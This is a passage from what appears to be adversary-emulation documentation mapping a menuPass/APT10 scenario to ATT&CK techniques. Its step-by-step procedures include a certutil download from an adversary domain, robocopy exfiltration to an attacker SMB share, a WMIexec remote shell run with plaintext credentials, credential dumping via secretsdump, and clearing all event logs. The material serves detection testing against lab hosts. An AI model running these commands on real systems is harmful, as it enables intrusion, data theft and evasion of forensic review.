<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster executes <code v-pre>net user kmimi /domain</code></td>
<td>-</td>
<td>T1087.002 Account Discovery: Domain Account</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster downloads secretsdump.exe</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/core.cpp#L196">ExecShellcode</a></td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster executes secretsdump.exe with kizumi.da hash</td>
<td>-</td>
<td>T1550.002 Use Alternate Authentication Material: Pass the Hash</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>secretsdump.exe dumps local SAM hashes</td>
<td><a href="../../resources/impacket/">impacket</a></td>
<td>T1003.002 OS Credential Dumping: Security Account Manager</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>secretsdump.exe dumps cached domain login information</td>
<td><a href="../../resources/impacket/">impacket</a></td>
<td>T1003.005 OS Credential Dumping: Cached Domain Credentials</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>secretsdump.exe dumps LSA secrets</td>
<td><a href="../../resources/impacket/">impacket</a></td>
<td>T1003.004 OS Credential Dumping: LSA Secrets</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster executes curl to exfiltrate the dump output</td>
<td>-</td>
<td>T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>
<doc-anchor-target id="step-9---data-collection--exfiltration">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-9---data-collection--exfiltration">#</doc-anchor-trigger>
        <span>Step 9 - Data Collection &amp; Exfiltration</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>menuPass uses SodaMaster to first download a modified <code v-pre>WMIexec.vbs</code> to
<code v-pre>C:\Users\kmimi\appdata\local\temp\w.vbs</code> on the bastion workstation <code v-pre>kimeramon (10.20.20.11)</code>.
Then, menuPass executes <code v-pre>w.vbs</code> with the cracked plaintext password of the file
server administrator <code v-pre>kmimi</code> to connect to the file server <code v-pre>alphamon (10.20.10.23)</code>.</p>
<p>menuPass uses the reverse shell on the file server <code v-pre>alphamon (10.20.10.23)</code> to
execute several PowerShell commands to enumerate and identify files of
interest. menuPass then uses certutil to download WinRAR.exe to the file server
<code v-pre>alphamon (10.20.10.23)</code> to <code v-pre>C:\Program Files\conhost.exe</code>. Then, menuPass
executes WinRAR to compress files of interest. menuPass exfiltrates the
compressed files using RoboCopy to an adversary controlled SMB share.</p>
<p>Once exfiltration of files is complete, menuPass clears the Windows event logs
on the file server and command history.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to the RDP session on the Kali attack host <code v-pre>kraken (176.59.1.18)</code></p>
</li>
<li><p>Open a terminal window and start the SMB server:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo mkdir /opt/menu_pass/digirevenge
sudo impacket-smbserver digirevenge /opt/menu_pass/digirevenge -smb2support</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using SodaMaster, download <code v-pre>WMIexec.vbs</code> to the bastion workstation
<code v-pre>kimeramon (10.20.20.11)</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{&quot;id&quot;:&quot;s&quot;, &quot;payload&quot;:&quot;w.vbs&quot;, &quot;payloadPath&quot;:&quot;C:/Users/kmimi/appdata/local/temp/&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Initiate an RDP session to the bastion workstation <code v-pre>kimeramon (10.20.20.11)</code>
using the file server administrator <code v-pre>kmimi</code> credentials to authenticate.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>DIGIREVENGE\kmimi</td>
<td>cHjc3p3hJHJYPUzT@</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Using the RDP session, open a Command Prompt
then execute <code v-pre>WMIexec.vbs</code> with the file server administrator <code v-pre>kmimi</code>
credentials targeting the file server <code v-pre>alphamon (10.20.10.23)</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cscript.exe C:\Users\kmimi\appdata\local\temp\w.vbs /shell 10.20.10.23 DIGIREVENGE\kmimi cHjc3p3hJHJYPUzT@</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the reverse shell to the file server, execute PowerShell file discovery
commands</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">powershell.exe &quot;Get-SmbShare | foreach-object -process { if($_.Path) { dir $_.Path } }&quot; -wait4145</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the reverse shell to the file server, execute <code v-pre>certutil.exe</code> to
download <code v-pre>WinRAR.exe</code> to the file server from the adversary server</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">certutil.exe -urlcache -f http://ten-cent.us/files/giag1.crl &quot;C:\Program Files\conhost.exe&quot;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the reverse shell to the file server, execute <code v-pre>WinRAR.exe</code> to compress
each file path containing files of interest</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cd &quot;C:\Program Files&quot;</code></pre>
</doc-codeblock></div>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">conhost.exe a -r C:\Windows\Temp\wmilog.rar F:\data</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the reverse shell to the file server, mount an adversary controlled
SMB share then execute the <code v-pre>RoboCopy</code> utility to exfiltrate the RAR to the
adversary controlled SMB share</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">net use \\manhwajia.au\digirevenge &amp; robocopy C:\Windows\Temp \\manhwajia.au\digirevenge wmilog.rar /mt /z</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Switch to an open terminal in Kali and confirm the exfiltration was successful</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">ls -l /opt/menu_pass/digirevenge</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to the RDP with the reverse shell and, using the reverse shell to the file server, execute the <code v-pre>wevtutil</code> utility to
clear Windows event logs</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">for /F &quot;tokens=*&quot; %1 in ('wevtutil.exe el') DO wevtutil.exe cl &quot;%1&quot; -wait4145</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit the shell</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Close the Command Prompt then disconnect from the RDP session</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/">https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/</a></li>
<li><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf">http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
<li><a href="https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html">https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html</a></li>
<li><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks">https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks</a></li>
<li><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf">https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>SodaMaster downloads WMIexec.vbs</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/core.cpp#L196">ExecShellcode</a></td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>WMIexec.vbs creates a remote WMI connection to the file server</td>
<td><a href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs" class="outbound" target="_blank"><span>wmiexec.vbs</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
<td>T1047 Windows Management Instrumentation</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>WMIexec.vbs establishes reverse shell</td>
<td><a href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs" class="outbound" target="_blank"><span>wmiexec.vbs</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
<td>T1059.003 Command and Scripting Interpreter: Windows Command Shell</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Reverse shell executes PowerShell</td>
<td><a href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs" class="outbound" target="_blank"><span>wmiexec.vbs</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
<td>T1059.001 Command and Scripting Interpreter: PowerShell</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Reverse shell uses PowerShell to enumerate file shares</td>
<td><a href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs" class="outbound" target="_blank"><span>wmiexec.vbs</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
<td>T1135 Network Share Discovery</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Reverse shell uses PowerShell to enumerate files on discovered file shares</td>
<td><a href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs" class="outbound" target="_blank"><span>wmiexec.vbs</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
<td>T1039 Data from Network Shared Drive</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>certutil.exe downloads WinRAR.exe</td>
<td>-</td>
<td>T1105 Ingress Tool Transfer</td>
